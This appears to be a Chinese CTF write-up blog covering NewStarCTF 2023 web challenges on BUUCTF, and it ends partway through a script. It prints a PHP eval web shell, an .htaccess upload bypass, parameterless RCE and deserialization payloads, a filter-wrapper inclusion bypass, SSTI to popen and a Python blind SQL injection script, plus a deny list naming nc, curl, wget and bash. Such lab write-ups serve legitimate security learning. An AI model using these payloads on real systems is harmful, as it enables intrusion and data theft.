2023 公开赛道]Begin of Upload</h2><p>一道朴实无华的文件上传，步骤无非就是：写:horse:，抓包，改后缀绕过，访问文件，RCE</p><img src="/2024/03/20/buuctf/buu/image-20240326122050719.png" class="" title="image-20240326122050719"><p>这里说一下我为什么传php会成功</p><p>可以分析源码</p><img src="/2024/03/20/buuctf/buu/image-20240326122137513.png" class="" title="image-20240326122137513"><p>这里这里的检查位于前端，用js写成的，我们用火狐的插件Javascript Switcher直接把js给ban了就行，这样就不会过滤了</p><p>:::warning</p><p>有的时候，文件上传功能也会用js编写，所以这种工具在使用时要具体情况具体分析</p><p>:::</p><p>:horse:的路径有了，可直接访问</p><img src="/2024/03/20/buuctf/buu/image-20240326122542130.png" class="" title="image-20240326122542130"><p>我这里写:horse:是<code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code></p><h2 id="NewStarCTF-2023-公开赛道-Begin-of-PHP"><a href="#NewStarCTF-2023-公开赛道-Begin-of-PHP" class="headerlink" title="[NewStarCTF 2023 公开赛道]Begin of PHP"></a>[NewStarCTF 2023 公开赛道]Begin of PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以爆破，也可以数组绕过</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 1=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$flag1</span> = True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以数组绕过，具体原因可以去搜搜</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$flag2</span> = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 依旧是数组绕过，这里主要是构造NULL，使得NULL == 0</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$flag3</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 变量输出的特性，当字符串被当做数字输出时，会截取第一个非数字的字符前的所有数字，若第一个是非数字字符，则会输出0</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 4=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span>)&#123;</span><br><span class="line">            <span class="variable">$flag4</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 4&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// extract函数的变量覆盖漏洞，当传入的数据经过此函数处理时，若数据中含有脚本中相同的变量名，那么该数据会覆盖原来的变量。这里有变量$flag5，所以可以传入flag5=...（只要变量值不含字母数字即可）</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考payload：<code>GET /?key1[]=1&amp;key2[]=2&amp;key4[]=1&amp;key5=2024s</code>、<code>POST key3[]=1&amp;flag5=.</code></p><h2 id="NewStarCTF-2023-公开赛道-泄漏的秘密"><a href="#NewStarCTF-2023-公开赛道-泄漏的秘密" class="headerlink" title="[NewStarCTF 2023 公开赛道]泄漏的秘密"></a>[NewStarCTF 2023 公开赛道]泄漏的秘密</h2><p>直接找<a href="http://www.zip即可">www.zip即可</a></p><h2 id="NewStarCTF-2023-公开赛道-R-C-E-1"><a href="#NewStarCTF-2023-公开赛道-R-C-E-1" class="headerlink" title="[NewStarCTF 2023 公开赛道]R!!C!!E!!"></a>[NewStarCTF 2023 公开赛道]R!!C!!E!!</h2><p>git信息泄露，用Githack可以得到文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123; <span class="comment">// 这里检查的是$star是否符合非标点符号以外的字符+递归函数的调用与替换</span></span><br><span class="line">    <span class="comment">//说的清楚点，[^\W]是匹配非标点以外的任何字符，这里的作用应该是匹配函数名</span></span><br><span class="line">    <span class="comment">// \((?R)?\)转义字符\不用关心，转换下来就是((?R)?)，(?R)?表示匹配嵌套的函数，但是函数的参数无法处理</span></span><br><span class="line">    <span class="comment">// 当$star符合函数名加嵌套函数时，就可以进入到下一步了</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>综上，这是一道无参RCE，我们只需要引用函数并理解如何嵌套函数即可</p><p>由于<code>scandir</code>、<code>var_dump</code>、<code>get_defined_vars</code>被过滤，且函数处理不了参数，这时候可以考虑<code>getallheaders()</code></p><p>传入<code>?star=eval(next(getallheaders()));</code>，这里是先获取HTTP请求头的信息，然后用<code>next()</code>调用下一个元素（指请求头中的某个元素），把这个元素当做参数传给<code>eval()</code>执行（这里eval是能处理参数的，因为它匹配的是<code>[^\W]</code>，而<code>next(getallheaders())</code>匹配的是<code>(?R)?</code>，不能处理参数，只能调用函数）</p><img src="/2024/03/20/buuctf/buu/image-20240326142757191.png" class="" title="image-20240326142757191"><p>发现目标是修改UA（User-Agent），然后命令执行即可</p><h2 id="NewStarCTF-2023-公开赛道-Upload-again"><a href="#NewStarCTF-2023-公开赛道-Upload-again" class="headerlink" title="[NewStarCTF 2023 公开赛道]Upload again!"></a>[NewStarCTF 2023 公开赛道]Upload again!</h2><p>过滤了php后缀的文件，同时还对文件内容作检查，用&lt; script language=”php” &gt;绕过</p><img src="/2024/03/20/buuctf/buu/image-20240326145245713.png" class="" title="image-20240326145245713"><p>这里我们不能直接访问1.jpg来getshell，需要用.htaccess文件，该文件可以实现的功能包括但不限于：用户自动重定向、自定义错误页面、改变你的文件扩展名等等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>上传后访问1.jpg即可getshell</p><img src="/2024/03/20/buuctf/buu/image-20240326150006272.png" class="" title="image-20240326150006272"><h2 id="NewStarCTF-2023-公开赛道-Unserialize？"><a href="#NewStarCTF-2023-公开赛道-Unserialize？" class="headerlink" title="[NewStarCTF 2023 公开赛道]Unserialize？"></a>[NewStarCTF 2023 公开赛道]Unserialize？</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>简单的反序列化，注意上传的时候要URL编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;nl /*&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>（还没测试，在写题目的时候平台正在维护，于是就跑步去了）</p><p>（平台有点问题，我还以为写错了，把wp搬上去之后发现也没有回显）</p><h2 id="NewStarCTF-2023-公开赛道-include-0。0"><a href="#NewStarCTF-2023-公开赛道-include-0。0" class="headerlink" title="[NewStarCTF 2023 公开赛道]include 0。0"></a>[NewStarCTF 2023 公开赛道]include 0。0</h2><p>文件包含有多种方法，这里就说最常见的一个：伪协议base64编码直接读取</p><p>源码过滤了base，用url双编码绕过：<code>?file=php://filter/read=convert.bas%256564-encode/resource=flag.php</code>（把e编码两次）</p><h2 id="NewStarCTF-2023-公开赛道-游戏高手"><a href="#NewStarCTF-2023-公开赛道-游戏高手" class="headerlink" title="[NewStarCTF 2023 公开赛道]游戏高手"></a>[NewStarCTF 2023 公开赛道]游戏高手</h2><p>在控制台内将gameScore改为100000以上的数字就行（gameScore可以在调试器内看）</p><img src="/2024/03/20/buuctf/buu/image-20240327135616508.png" class="" title="image-20240327135616508"><h2 id="NewStarCTF-2023-公开赛道-GenShin"><a href="#NewStarCTF-2023-公开赛道-GenShin" class="headerlink" title="[NewStarCTF 2023 公开赛道]GenShin"></a>[NewStarCTF 2023 公开赛道]GenShin</h2><p>抓包发现响应头有文件</p><img src="/2024/03/20/buuctf/buu/image-20240327135927184.png" class="" title="image-20240327135927184"><p>根据提示传一个name进去</p><img src="/2024/03/20/buuctf/buu/image-20240327140038917.png" class="" title="image-20240327140038917"><p>也许是ssti，看看有没有</p><img src="/2024/03/20/buuctf/buu/image-20240327140519214.png" class="" title="image-20240327140519214"><p>被过滤了，应该是存在ssti的。</p><p>测试发现%没有被过滤，可以用<code>&#123;%print%&#125;</code>输出</p><img src="/2024/03/20/buuctf/buu/image-20240327142514721.png" class="" title="image-20240327142514721"><p>看看子类有什么可以用的</p><img src="/2024/03/20/buuctf/buu/image-20240327142845116.png" class="" title="image-20240327142845116"><p>由于init被过滤掉了，考虑用attr绕过</p><img src="/2024/03/20/buuctf/buu/image-20240327143312921.png" class="" title="image-20240327143312921"><img src="/2024/03/20/buuctf/buu/image-20240327143716819.png" class="" title="image-20240327143716819"><p>找到popen之后就可以操作了</p><img src="/2024/03/20/buuctf/buu/image-20240327143908532.png" class="" title="image-20240327143908532"><p>:::info</p><p>这题我没有检测出来空格是否被过滤掉，因为cat /flag中间有空格会报400，不知是什么原因。</p><p>对了，popen也被过滤掉了</p><p>:::</p><h2 id="NewStarCTF-2023-公开赛道-R-C-E-2"><a href="#NewStarCTF-2023-公开赛道-R-C-E-2" class="headerlink" title="[NewStarCTF 2023 公开赛道]R!!!C!!!E!!!"></a>[NewStarCTF 2023 公开赛道]R!!!C!!!E!!!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>:::warning</p><p>exec函数在浏览器中是没有反应的，所以只能靠写文件的方式把命令的运行结果表示出来</p><p>:::</p><p>脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;ls /|te&#x27;&#x27;e /var/www/html/2.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;qwejaskdjnlka = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="NewStarCTF-2023-公开赛道-medium-sql"><a href="#NewStarCTF-2023-公开赛道-medium-sql" class="headerlink" title="[NewStarCTF 2023 公开赛道]medium_sql"></a>[NewStarCTF 2023 公开赛道]medium_sql</h2><p>过滤的部分可以考虑大小写绕过</p><p>由于在考虑联合注入的时候提示说不能用union，那多半是盲注了</p><img src="/2024/03/20/buuctf/buu/image-20240327152504565.png" class="" title="image-20240327152504565"><p>测试一下布尔盲注</p><img src="/2024/03/20/buuctf/buu/image-20240329163359515.png" class="" title="image-20240329163359515"><img src="/2024/03/20/buuctf/buu/image-20240329163415239.png" class="" title="image-20240329163415239"><p>确认出是布尔盲注，可以写脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://b1e9c46d-af66-4936-a026-9b3a1a236c3c.node5.buuoj.cn:81/?id=TMP11503\&#x27; And &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">res</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;compulsory&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checklength</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        payload = <span class="string">&#x27;if((length(database())=&#123;&#125;),1,0)--+&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        str2 = url + payload</span><br><span class="line">        <span class="comment"># print(str2)</span></span><br><span class="line">        res = requests.get(url=str2)</span><br><span class="line">        <span class="keyword">if</span> check(res):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Database\&#x27;s length is :&#x27;</span>, i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkdataname</span>():</span><br><span class="line">    databasename = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            payload = <span class="string">&#x27;if((asCii(suBstr(database(),&#123;&#125;,1)))&gt;&#123;&#125;,1,0)--+&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            str3 = url + payload</span><br><span class="line">            <span class="comment"># print(str3)</span></span><br><span class="line">            res = requests.get(url=str3)</span><br><span class="line">            <span class="keyword">if</span> check(res):</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        databasename += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(databasename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checktable</span>():</span><br><span class="line">    tablename = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span>(left&lt;right):</span><br><span class="line">            payload = <span class="string">&#x27;if((asCii(Substr((selEct groUp_Concat(tabLe_nAme) frOm infOrMation_schEma.taBles whEre tabLe_Schema = database()),&#123;&#125;,1)))&gt;&#123;&#125;,1,0)--+&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            str4 = url + payload</span><br><span class="line">            <span class="comment"># print(str4)</span></span><br><span class="line">            res = requests.get(url=str4)</span><br><span class="line">            <span class="keyword">if</span> check(res):</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        tablename += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(tablename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkcolumn</span>():</span><br><span class="line">    columnname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">80</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = 